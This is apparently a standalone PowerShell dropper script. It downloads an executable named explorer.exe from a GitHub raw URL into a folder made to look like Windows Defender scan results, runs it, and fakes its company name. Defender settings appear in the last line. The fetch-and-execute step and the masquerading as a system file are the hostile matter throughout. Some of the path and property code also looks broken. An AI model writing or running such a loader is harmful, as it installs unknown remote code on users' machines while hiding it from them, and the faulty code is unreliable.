$url = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/explorer.exe"
New-Item -Path (Join-Path -Path $env:LOCALAPPDATA -ChildPath "\Microsoft\Windows Defender\ScanResults\" -Resolve) -Name "ScanResult_\$($url.ToString().Split('/') | Select-Object -Index 2).txt" -ItemType File | Out-Null

$response = Invoke-WebRequest -Uri $url -OutFile "$env:LOCALAPPDATA\Microsoft\Windows Defender\ScanResults\$(($url.ToString().Split('/') | Select-Object -Index 2).Replace('/raw/', ''))\explorer.exe" | Out-Null

$downloadedFileName = "$env:LOCALAPPDATA\Microsoft\Windows Defender\ScanResults\$(($url.ToString().Split('/') | Select-Object -Index 2).Replace('/raw/', ''))\explorer.exe"
Start-Process -Wait -FilePath $downloadedFileName -ArgumentList $args
Start-Sleep -S 1
New-ItemProperty -Path $downloadedFileName -Name CompanyName -PropertyType String -Value "<Company Name>" -PropertyValue "<Company Name> Company"
Set-MpPreference -DisableRealtimeMonitoring $false